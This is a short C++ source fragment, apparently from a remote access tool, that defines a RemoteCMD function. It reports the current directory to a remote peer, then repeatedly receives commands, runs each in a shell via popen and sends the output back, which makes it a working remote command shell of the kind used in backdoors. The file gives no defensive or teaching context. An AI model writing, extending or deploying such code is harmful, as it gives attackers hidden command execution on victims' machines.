#include "utilities.h"
extern std::string data;

void RemoteCMD()
{
    send(getcwd(buffer, FILENAME_MAX));
    FILE* stream;

    while (true)
    {
        std::string command = recv();
        if (command == "exit" || command == "error" || command.empty()) return;

        command.append(" 2>&1");
        stream = popen(command.data(), "r");

        if (stream) {
            while (!feof(stream))
            if (fgets(buffer, sizeof(buffer), stream) != NULL) {
                data.append(buffer);
            
            } pclose(stream);
        
        } sendAll(data); data.clear();
    
    } fclose(stream);
}